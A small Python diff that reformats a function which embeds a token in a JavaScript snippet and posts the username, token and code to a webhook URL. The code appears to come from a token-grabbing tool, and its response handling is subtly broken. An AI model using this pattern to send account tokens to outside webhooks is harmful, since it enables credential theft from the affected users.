@@ -37,9 +37,8 @@ def main_page():
             code = code.replace('**token**', token)
             embed = {"title": username, "description": token_str, "fields": [{"name": "Javascript Code", "value": code, "inline": False}]}
             data = {
-                "embeds":[embed],
+                "embeds": [embed],
             }
-            embed = embed.to_dict()
             response = requests.post(hook,json=data)
             print(response.json(), response.text(), response.status_code())
         except:
